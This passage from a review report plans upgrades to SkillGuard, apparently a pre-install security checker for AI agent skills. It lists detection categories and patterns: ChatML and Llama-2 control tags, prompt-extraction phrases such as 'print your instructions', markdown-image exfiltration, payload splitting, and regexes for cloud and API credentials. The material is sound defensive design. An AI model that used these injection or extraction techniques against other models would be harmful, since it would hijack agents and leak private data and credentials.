- Cross-artifact toxic flow: does the package as a whole enable untrusted-input → private-data-access → network-egress?
- Latent injection surface: does any file instruct Claude to process external/user content?
- System prompt leakage instructions
- Tool shadowing (referencing other skills/tools in override context)
- Output impact: what would Claude produce if these instructions were followed? Is that output safe?

**Updated Step 4 — Always-present reviewer roles: A, B, G**
Add Reviewer G (Output Impact Analyst) as a mandatory third reviewer alongside A and B.

**Updated Step 4 — Dynamic reviewer spawn criteria**
Add: spawn Reviewer H (Toxic Flow Analyst) when any combination of (untrusted content intake) + (data access) + (network calls) is detected.

**Finding codes in Step 6**
Each finding should include a structured code. Suggested format:
```
Finding Code: [SEVERITY]-[CATEGORY]-[SEQUENCE]
OWASP: LLM0X
Severity: Critical | High | Medium | Low | Informational
```

### What the new threat-catalog.md should contain

Add the following new categories:

**Category 10 — Markdown Exfiltration and Image Injection**
- Detection: markdown images with external URLs containing query parameters
- Detection: any external URL in image/link syntax that could carry data payloads
- Detection: SVG files with embedded JavaScript or external references

**Category 11 — LLM Control Structure Injection**
- Detection: ChatML tags (`<|im_start|>`, `<|im_end|>`)
- Detection: Guidance framework tags (`{{#system~}}`, `{{#user~}}`)
- Detection: Llama-2 system tags (`<s>[INST] <<SYS>>`)
- Detection: GPT-4V multimodal injection markers
- Detection: `[system](#assistant)`, `[system](#context)`

**Category 12 — Toxic Flow Combinations**
- Detection: presence of all three: untrusted content intake + private data access + network egress capability
- Detection: presence of both: untrusted content intake + destructive capability

**Category 13 — Financial Execution Risk**
- Detection: payment API references (Stripe, PayPal, Square, Braintree)
- Detection: cryptocurrency operations (wallet addresses, web3.js, ethers.js)
- Detection: banking API references
- Detection: market order execution (buy, sell, execute trade)

**Category 14 — System Prompt Leakage**
- Detection: instructions to reveal system prompt
- Detection: instructions to output the contents of loaded skills
- Detection: instructions to "repeat everything above" or "print your instructions"

**Category 15 — Latent / Indirect Injection Surface**
- Detection: instructions to read, process, or summarize external content (URLs, files, emails, user uploads)
- Risk note: the actual injection cannot be reviewed statically; flag the surface

**Expand Category 1 — Prompt Injection**
Add adversarial suffix patterns, Unicode homoglyph instructions to detect, multilingual injection awareness, payload-splitting across files.

**Expand Category 3 — Encoded Payloads**
Add: rot13, braille Unicode range, zero-width characters, Unicode homoglyphs, non-printing characters, adversarial suffixes of non-ASCII characters.

**Expand Category 4 — Credential Detection**
Add provider-specific patterns: `sk-ant-` (Anthropic admin/API), `sk-` (OpenAI), `AKIA[A-Z0-9]{16}` (AWS), `ghp_|gho_|ghs_` (GitHub), `AIza` (Google), `xox[pborsa]-` (Slack), `-----BEGIN (RSA|EC|OPENSSH|PGP|DSA) PRIVATE KEY-----`, JWT format `eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+`. Add Shannon entropy guidance: any >20-char string with high character diversity and no recognizable words.

### What the new report-template.md should contain

Add to the Red Flags Table: columns for Finding Code and OWASP LLM mapping.

Add new Section 13: Supply Chain Assessment
- Publisher identity: [known org / anonymous / recently created account]
- Version pinning: [all pinned / some unpinned / unpinned — risk level]
- Dependency count: [N direct dependencies]
- Registry source: [official PyPI/npm/etc / unofficial / git-based]
- Provenance: [verifiable / unverifiable]

Add to Section 12 (Confidence Score): the structured scoring formula from recommendation P1.

Add Appendix A: Finding Code Reference (inline in the report).

### What the new reviewer-guide.md should contain

Add full checklists for Reviewer G (Output Impact Analyst) and Reviewer H (Toxic Flow Analyst).

Add false positive reduction guidance (section Fp1/Fp2 above).

Add LLM control structure injection patterns to Reviewer B's checklist.

Add financial execution risk to Reviewer A's checklist.

Add system prompt leakage patterns to Reviewer B's checklist.

Add toxic flow classification table: which file capabilities classify as "untrusted content source," "private data accessor," "public sink," "destructive action."

---

## 8. Files to Update

### File 1: skills/skillguard/references/threat-catalog.md
**Changes needed:**
- Add Category 10: Markdown Exfiltration and Image Injection (new section)
- Add Category 11: LLM Control Structure Injection (new section)
- Add Category 12: Toxic Flow Combinations (new section)
- Add Category 13: Financial Execution Risk (new section)
- Add Category 14: System Prompt Leakage (new section)
- Add Category 15: Latent / Indirect Injection Surface (new section)
- Expand Category 1 detection patterns: add adversarial suffixes, Unicode homoglyphs, payload splitting, multilingual obfuscation, LLM control tags
- Expand Category 3 detection patterns: add rot13, braille, zero-width characters, Unicode homoglyphs, non-ASCII adversarial strings
- Expand Category 4 detection patterns: add 10+ provider-specific credential patterns listed above, add Shannon entropy guidance
- Expand Category 5 URL list: add URL shorteners explicitly, add raw paste sites, add anonymous hosting
- Add OWASP LLM Top 10 mapping table at the end of each category

### File 2: skills/skillguard/references/report-template.md
**Changes needed:**
- Add Finding Code column to Red Flags Table
- Add OWASP column to Red Flags Table
- Add Section 13: Supply Chain Assessment (new section after Section 12)
- Update Section 12 (Confidence Score) to reference structured scoring formula
- Add optional Appendix A: Machine-Readable Summary (JSON block)
- Update reviewer sections to include G and H as dynamic reviewers

### File 3: skills/skillguard/references/reviewer-guide.md
**Changes needed:**
- Add Reviewer G full specification: Output Impact Analyst (role, spawn conditions, checklist)
- Add Reviewer H full specification: Toxic Flow Analyst (role, spawn conditions, checklist, toxic flow classification table)
- Update Reviewer B checklist: add LLM control structure tags, system prompt leakage patterns, adversarial suffix awareness, multilingual injection, payload splitting
- Update Reviewer A checklist: add financial execution risk, provider-specific credential patterns, URL shortener flags
- Add False Positive Reduction section with known-safe pattern exceptions and context-awareness guidance
- Add structured confidence scoring formula
- Add severity computation rules (Critical=100, High=70, etc.) and escalation logic
- Add toxic flow classification table (untrusted content sources, private data accessors, public sinks, destructive actions)
- Add OWASP LLM Top 10 reference table

### File 4: skills/skillguard/SKILL.md
**Changes needed:**
- Update Step 3 (Two-Pass Review) to explicitly list the new detection categories from the expanded threat catalog
- Update Step 4 (Review Council) to add Reviewer G as always-present (third mandatory reviewer) and Reviewer H as dynamic spawn condition
- Add finding code format specification in Step 6 guidance
- Add reference to the new supply chain section in Step 6
- Update Step 7 (Installation Gate) to reference the updated severity escalation rules

---

## Summary

SkillGuard v1.0 is architecturally sound — its multi-reviewer council, hard installation gate, and comprehensive 12-section report template represent best-in-class design for a pre-install security gate. No reviewed project implements a comparable pre-install human-approval workflow.

However, SkillGuard's detection coverage has significant gaps compared to what the reviewed projects collectively implement. The most critical gaps are: markdown image exfiltration (a known active attack), LLM control structure injection (model-level role hijacking), toxic flow analysis (cross-artifact threat correlation), and provider-specific credential patterns (current patterns miss most real leaked credentials). These four gaps represent the highest-priority improvements.

The second tier of improvements — latent injection, adversarial suffix detection, Shannon entropy scoring, OWASP taxonomy mapping, and structured finding codes — would materially improve the quality and completeness of SkillGuard's analysis without changing its fundamental architecture.

SkillGuard's core strength — requiring explicit human approval before any installation proceeds — is not replicated by any reviewed project and should be preserved as the non-negotiable foundation of v2.

---

*Report generated by static inspection only. No code executed. No installs performed.*
*Workspace: /tmp/skillguard-review-workspace/*
*SkillGuard source: /Users/bryan/.claude/plugins/cache/local/skillguard/1.0.0/*
